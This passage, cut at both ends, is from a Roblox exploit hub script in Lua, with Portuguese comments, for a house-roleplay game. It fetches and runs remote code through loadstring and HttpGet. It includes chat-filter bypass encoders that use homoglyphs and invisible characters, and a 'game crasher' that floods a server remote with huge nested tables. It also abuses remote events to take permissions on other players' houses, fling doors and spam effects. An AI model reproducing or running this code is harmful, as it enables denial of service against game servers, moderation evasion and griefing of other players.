        print("Backpack não encontrado.")
    end
end

-- Checar e equipar Sniper e FireX
equiparItem("Sniper")
equiparItem("Taser")
    end
})

local toggleActive = false
local function loopTaser()
while toggleActive do
local args = {
    [1] = "Taser",
    [2] = "On"
}

game:GetService("Players").LocalPlayer.Character.FireX.ToolSound:FireServer(unpack(args))
wait(0.111111111111111111111111) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Taser",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopTaser()
end
end
})


loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))() -- anti chat logger (not by me)

function chat(msg)

    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
    else
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end

end

local Tab = Window:MakeTab({
	Name = "Chat Bypass",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


local method = nil

Tab:AddDropdown({
	Name = "Method",
	Options = {"ěx́ǎḿṕĺě", "éxạmṕĺe", "ẹ̲х̲ạ̲ṃ̲р̲ḷ̲ẹ̲", "e>x>a>m>p>l>e", "￵example (patched)", "3></-\\/\\/\\p|_3"},
	Callback = function(val)
        method = val
	end
})

function bypasstext(text, method)
    if method == 1 then
        local function addAccents(word)
            local accents = {
                a = "ǎ",
                b = "ḃ",
                c = "ć",
                d = "d́",
                e = "ě",
                f = "ḟ",
                g = "ġ",
                h = "ḣ",
                i = "í",
                j = "j́",
                k = "ḱ",
                l = "ĺ",
                m = "ḿ",
                n = "n̋",
                o = "ō",
                p = "ṕ",
                q = "q́",
                r = "ŕ",
                s = "ś",
                t = "t̋",
                u = "ū",
                v = "v̇",
                w = "ẃ",
                x = "x́",
                y = "ý",
                z = "ź",
                A = "Ǎ",
                B = "Ḃ",
                C = "Ć",
                D = "D́",
                E = "Ě",
                F = "Ḟ",
                G = "Ġ",
                H = "Ḣ",
                I = "Í",
                J = "J́",
                K = "Ḱ",
                L = "Ĺ",
                M = "Ḿ",
                N = "N̋",
                O = "Ō",
                P = "Ṕ",
                Q = "Q́",
                R = "Ŕ",
                S = "Ś",
                T = "T̋",
                U = "Ū",
                V = "V̇",
                W = "Ẃ",
                X = "X́",
                Y = "Ý",
                Z = "Ź"
            }

            local bypassedWord = ""
            for i = 1, #word do
                local letter = word:sub(i, i)
                if accents[letter] then
                    bypassedWord = bypassedWord .. accents[letter]
                else
                    bypassedWord = bypassedWord .. letter
                end
            end

            return bypassedWord
        end

        local function bypassString(input)
            local words = {}
            for word in string.gmatch(input, "%S+") do
                table.insert(words, addAccents(word))
            end
            return table.concat(words, " ")
        end

        return bypassString(text)
    elseif method == 2 then
        local function addAccents2(word)
            local accents2 = {
                a = "ạ",
                b = "ḃ",
                c = "c",
                d = "d́",
                e = "e",
                f = "ḟ",
                g = "ġ",
                h = "ḣ",
                i = "i",
                j = "j́",
                k = "ḳ",
                l = "ĺ",
                m = "m",
                n = "n̋",
                o = "o",
                p = "ṕ",
                q = "q́",
                r = "ŕ",
                s = "ṣ",
                t = "t",
                u = "ụ",
                v = "v̇",
                w = "ẃ",
                x = "x́",
                y = "y",
                z = "z",
                A = "Ạ",
                B = "Ḃ",
                C = "C",
                D = "D́",
                E = "E",
                F = "Ḟ",
                G = "Ġ",
                H = "Ḣ",
                I = "I",
                J = "J́",
                K = "Ḱ",
                L = "Ĺ",
                M = "M",
                N = "N",
                O = "O",
                P = "Ṕ",
                Q = "Q́",
                R = "Ŕ",
                S = "Ṣ",
                T = "T",
                U = "Ụ",
                V = "V̇",
                W = "Ẃ",
                X = "X́",
                Y = "Y",
                Z = "Z"
            }

            local bypassedWord = ""
            for i = 1, #word do
                local letter = word:sub(i, i)
                if accents2[letter] then
                    bypassedWord = bypassedWord .. accents2[letter]
                else
                    bypassedWord = bypassedWord .. letter
                end
            end

            return bypassedWord
        end

        local function bypassString(input)
            local words = {}
            for word in string.gmatch(input, "%S+") do
                table.insert(words, addAccents2(word))
            end
            return table.concat(words, " ")
        end

        return bypassString(text)
    elseif method == 3 then
        local function addAccents3(word)
            local accents3 = {
                a = "ạ̲",
                b = "ḅ̲",
                c = "с̲",
                d = "ḍ̲",
                e = "ẹ̲",
                f = "f̲",
                g = "ɡ̲",
                h = "ḥ̲",
                i = "ị̲",
                j = "ј̲",
                k = "ḳ̲",
                l = "ḷ̲",
                m = "ṃ̲",
                n = "ṇ̲",
                o = "ọ̲",
                p = "р̲",
                q = "q̲",
                r = "ṛ̲",
                s = "ṣ̲",
                t = "ṭ̲",
                u = "ụ̲",
                v = "ṿ̲",
                w = "ẉ̲",
                x = "х̲",
                y = "ỵ̲",
                z = "ẓ̲",
                A = "Ạ̲",
                B = "Ḅ̲",
                C = "С̲",
                D = "Ḍ̲",
                E = "Ẹ̲",
                F = "F̲",
                G = "Ɡ̲",
                H = "Ḥ̲",
                I = "Ị̲",
                J = "Ј̲",
                K = "Ḳ̲",
                L = "Ḷ̲",
                M = "Ṃ̲",
                N = "Ṇ̲",
                O = "Ọ̲",
                P = "Р̲",
                Q = "Q̲",
                R = "Ṛ̲",
                S = "Ṣ̲",
                T = "Ṭ̲",
                U = "Ụ̲",
                V = "Ṿ̲",
                W = "Ẉ̲",
                X = "Х̲",
                Y = "Ỵ̲",
                Z = "Ẓ̲"
            }

            local bypassedWord = ""
            for i = 1, #word do
                local letter = word:sub(i, i)
                if accents3[letter] then
                    bypassedWord = bypassedWord .. accents3[letter]
                else
                    bypassedWord = bypassedWord .. letter
                end
            end

            return bypassedWord
        end

        local function bypassString(input)
            local words = {}
            for word in string.gmatch(input, "%S+") do
                table.insert(words, addAccents3(word))
            end
            return table.concat(words, " ")
        end

        return bypassString(text)
    elseif method == 4 then
        local function modifyText(input)
            local modifiedText = ""
            for i = 1, #input do
                modifiedText = modifiedText .. string.sub(input, i, i) .. ">"
            end

            return modifiedText
        end

        return modifyText(text)
    elseif method == 5 then
        local function addAccents5(word)
            local accents5 = {
                a = "a",
                b = "b￵￵",
                c = "c￵￵",
                d = "d",
                e = "￵￵e",
                f = "￵￵󠀕f￵￵",
                g = "g",
                h = "h￵￵",
                i = "￵￵i",
                j = "￵￵j￵￵",
                k = "k",
                l = "l￵￵",
                m = "m",
                n = "n",
                o = "o￵￵",
                p = "p",
                q = "q￵￵",
                r = "￵￵r￵￵",
                s = "￵￵s",
                t = "￵￵t￵￵",
                u = "u",
                v = "v",
                w = "w",
                x = "x",
                y = "y",
                z = "￵￵z￵￵󠀕",
                A = "A￵￵󠀕",
                B = "B",
                C = "C",
                D = "￵￵D",
                E = "￵￵E￵￵󠀕",
                F = "F￵￵",
                G = "￵￵G",
                H = "H",
                I = "￵￵I",
                J = "￵￵J",
                K = "K",
                L = "￵￵L",
                M = "M￵￵",
                N = "N￵￵",
                O = "O",
                P = "P￵￵",
                Q = "Q",
                R = "￵￵R",
                S = "S",
                T = "T",
                U = "￵￵U",
                V = "V",
                W = "W￵￵",
                X = "￵￵X",
                Y = "￵￵Y",
                Z = "Z￵￵󠀕"
            }

            local bypassedWord = ""
            for i = 1, #word do
                local letter = word:sub(i, i)
                if accents5[letter] then
                    bypassedWord = bypassedWord .. accents5[letter]
                else
                    bypassedWord = bypassedWord .. letter
                end
            end

            return bypassedWord
        end

        local function bypassString(input)
            local words = {}
            for word in string.gmatch(input, "%S+") do
                table.insert(words, addAccents5(word))
            end
            return table.concat(words, "")
        end

        return bypassString(text)
    elseif method == 6 then
        local function addAccents6(word)
            local accents6 = {
                a = "/-\\",
                b = "L3",
                c = "C",
                d = "CL",
                e = "3",
                f = "F",
                g = "G",
                h = "|-|",
                i = "L",
                j = "J",
                k = "L<",
                l = "|_",
                m = "/\\/\\",
                n = "/\\/",
                o = "0",
                p = "P",
                q = "Q",
                r = "R",
                s = "$",
                t = "T",
                u = "|_|",
                v = "\\/",
                w = "\\/\\/",
                x = "><",
                y = "Y",
                z = "Z"
            }

            local bypassedWord = ""
            for i = 1, #word do
                local letter = word:sub(i, i):lower()
                if accents6[letter] then
                    bypassedWord = bypassedWord .. accents6[letter]
                else
                    bypassedWord = bypassedWord .. letter
                end
            end

            return bypassedWord
        end

        local function bypassString(input)
            local words = {}
            for word in string.gmatch(input, "%S+") do
                table.insert(words, addAccents6(word))
            end
            return table.concat(words, " ")
        end

        return bypassString(text)
    end
end

Tab:AddTextbox({
	Name = "Chat",
	TextDisappear = true,
	Callback = function(val)
        if val ~= "" then
            if method == "ěx́ǎḿṕĺě" then
                chat(bypasstext(val, 1))
            elseif method == "éxạmṕĺe" then
                chat(bypasstext(val, 2))
            elseif method == "ẹ̲х̲ạ̲ṃ̲р̲ḷ̲ẹ̲" then
                chat(bypasstext(val, 3))
            elseif method == "e>x>a>m>p>l>e" then
                chat(bypasstext(val, 4))
            elseif method == "￵example (patched)" then
                chat(bypasstext(val, 5))
            elseif method == "3></-\\/\\/\\p|_3" then
                chat(bypasstext(val, 6))
            else
                OrionLib:MakeNotification({
                    Name = "Ops.",
                    Content = "Looks like you didn't select a method!",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Ops.",
                Content = "Looks like you didn't enter any text!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

local autobypass = false
local textBox = game:GetService("CoreGui").ExperienceChat.appLayout.chatInputBar.Background.Container.TextContainer.TextBoxContainer.TextBox

Tab:AddToggle({
    Name = "Auto Bypass",
    Default = false,
    Callback = function(val)
        autobypass = val

        if val == true then
            OrionLib:MakeNotification({
                Name = "Auto Bypass",
                Content = "Auto bypass has been enabled!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        else
            OrionLib:MakeNotification({
                Name = "Auto Bypass",
                Content = "Auto bypass has been disabled!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end

        textBox.FocusLost:Connect(function(enter)
            if enter and autobypass then
                if textBox.Text ~= "" then
                    if method == "ěx́ǎḿṕĺě" then
                        chat(bypasstext(textBox.Text, 1))
                        textBox.Text = ""
                    elseif method == "éxạmṕĺe" then
                        chat(bypasstext(textBox.Text, 2))
                        textBox.Text = ""
                    elseif method == "ẹ̲х̲ạ̲ṃ̲р̲ḷ̲ẹ̲" then
                        chat(bypasstext(textBox.Text, 3))
                        textBox.Text = ""
                    elseif method == "e>x>a>m>p>l>e" then
                        chat(bypasstext(textBox.Text, 4))
                        textBox.Text = ""
                    elseif method == "￵example (patched)" then
                        chat(bypasstext(textBox.Text, 5))
                        textBox.Text = ""
                    elseif method == "3></-\\/\\/\\p|_3" then
                        chat(bypasstext(textBox.Text, 6))
                        textBox.Text = ""
                    else
                        OrionLib:MakeNotification({
                            Name = "Ops.",
                            Content = "Looks like you didn't select a method!",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    end
                end
            end
        end)
    end
})


Tab:AddButton({
    Name = "Tall Message",
    Callback = function()
        chat("".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. " ".. "\u{000D}" .. "")
    end
})


Tab:AddButton({
    Name = "Fix Filter",
    Callback = function()
        chat("abcdefg()!")
    end
})


local Tab = Window:MakeTab({
Name = "House",
Icon = "rbxassetid://10734898355",
PremiumOnly = false
})


local casaNumbers = {}
for i = 1, 35 do
if i ~= 8 and i ~= 9 and i ~= 10 then
table.insert(casaNumbers, tostring(i))
end
end

local selectedCasaNumber = nil

Tab:AddDropdown({
Name = "Escolha o número da casa",
Options = casaNumbers,
Callback = function(number)
selectedCasaNumber = tonumber(number)
end
})

Tab:AddButton({
Name = "Pegar Permissão",
Callback = function()
if selectedCasaNumber then
local args = {
[1] = "GivePermissionLoopToServer",
[2] = game:GetService("Players").LocalPlayer,
[3] = selectedCasaNumber
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

else
print("Nenhum número de casa selecionado.")
end
end
})


local Section = Tab:AddSection({
    Name = "Loops "
})
local toggleState = false
local function toggleCurtains()
while toggleState do
local args = {
[1] = "Curtains"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
wait(1) -- ajusta o tempo de espera conforme necessário
end
end

Tab:AddToggle({
Name = "Toggle Curtains",
Default = false,
Callback = function(value)
toggleState = value
if toggleState then
toggleCurtains()
end
end
})

local toggleState = false
local function togglePool()
while toggleState do
local args = {
[1] = "PoolOnOff"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
wait(1) -- ajusta o tempo de espera conforme necessário
end
end

Tab:AddToggle({
Name = "Toggle Pool",
Default = false,
Callback = function(value)
toggleState = value
if toggleState then
togglePool()
end
end
})

local toggleState = false
local function toggleGarageDoor()
while toggleState do
local args = {
[1] = "GarageDoor"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
wait(1) -- ajusta o tempo de espera conforme necessário
end
end

Tab:AddToggle({
Name = "Toggle Garage Door",
Default = false,
Callback = function(value)
toggleState = value
if toggleState then
toggleGarageDoor()
end
end
})
local Section = Tab:AddSection({
    Name = "Fire Function"
})
Tab:AddButton({
	Name = "Fire On",
	Callback = function()
      	local args = {
    [1] = "PlayerWantsFireOnFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Fire Off",
	Callback = function()
      	local args = {
    [1] = "PlayerWantsFireOffFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
  	end    
})

local toggleActive = false
local function repeatRemote()
while toggleActive do
local args = {
[1] = "PlayerWantsFireOnFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
wait(0.1) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Fire ",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
repeatRemote()
end
end
})

local toggleActive = false
local function repeatRemote()
while toggleActive do
--This is a simple roblox game crasher made by casanova
--Github cfreemepq
--fixed script*

while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2) --// change values if client crashes.
end
wait(0.0) -- intervalo de 1 segundo entre cada repetição
end
end
local Section = Tab:AddSection({
	Name = "Doors"
})
Tab:AddButton({
Name = "DESTROY DOORS",
Callback = function()
local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local NetworkAccess = coroutine.create(function()
    settings().Physics.AllowSleep = false
    while game:GetService("RunService").RenderStepped:Wait() do
        for _, Players in next, game:GetService("Players"):GetPlayers() do
            if Players ~= game:GetService("Players").LocalPlayer then
                Players.MaximumSimulationRadius = 0 
                sethiddenproperty(Players, "SimulationRadius", 0) 
            end 
        end
        game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
        setsimulationradius(math.huge) 
    end 
end) 
coroutine.resume(NetworkAccess)
local function ForcePart(v)
    if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(999999, 999999, 999999)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2 
        AlignPosition.Attachment1 = Attachment1
    end
end
for _, v in next, game:GetService("Workspace"):GetDescendants() do
    ForcePart(v)
end
game:GetService("Workspace").DescendantAdded:Connect(function(v)
    ForcePart(v)
end)
UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)
spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Updated
    end
end)
end
})
Tab:AddParagraph("How to use","You need to have permission from the person's house and get close to the house.The function will not work if the house is locked, but if you have permission you can unlock it, this function works like the Ice Hub's fling Doors")
Tab:AddParagraph("Como usar","Você precisa ter permissão da casa da pessoa e chegar perto da casa. A função não funcionará se a casa estiver trancada, mas se você tiver permissão, poderá desbloqueá-la.esta função funciona como as portas de lançamento do Ice Hub")
local Section = Tab:AddSection({
	Name = "Get Permission Houses"
})
Tab:AddButton({
	Name = "House 1",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 2",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 2
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 3",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 3
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 4",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 4
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 5",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 5
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 6",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 6
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 7",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 7
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 8",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 8
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 9",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 9
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 10",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 10
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 11",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 11
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 12",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 12
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 13",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 13
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 14",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 14
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 15",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 15
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 16",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 16
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 17",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 17
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 18",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 18
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 19",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 19
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 20",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 20
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 21",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 21
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 22",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 22
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 23",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 23
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 24",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 24
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})


local Tab = Window:MakeTab({
Name = "Car",
Icon = "rbxassetid://10734898355",
PremiumOnly = false
})
local Section = Tab:AddSection({
    Name = "Velocity"
})

-- Variables
local CarSpeed = 200

-- Textbox for Car Speed
Tab:AddTextbox({
Name = "Car Speed",
Default = "",
TextDisappear = true,
Callback = function(value)
CarSpeed = tonumber(value)
end
})

-- Button to Update Car Speed
Tab:AddButton({
Name = "Update Speed",
Callback = function()
local args = {
[1] = "PlayerGiveSpeedLower",
[2] = CarSpeed
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Loop"
})

local toggleActive = false
local function loopDuke()
while toggleActive do
local args = {
    [1] = "Duke"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Duke",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopDuke()
end
end
})

local toggleActive = false
local function loopFlip()
while toggleActive do
local args = {
    [1] = "Flip"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Flip",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFlip()
end
end
})

local toggleActive = false
local function loopSmoke()
while toggleActive do
local args = {
    [1] = "Smoke"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
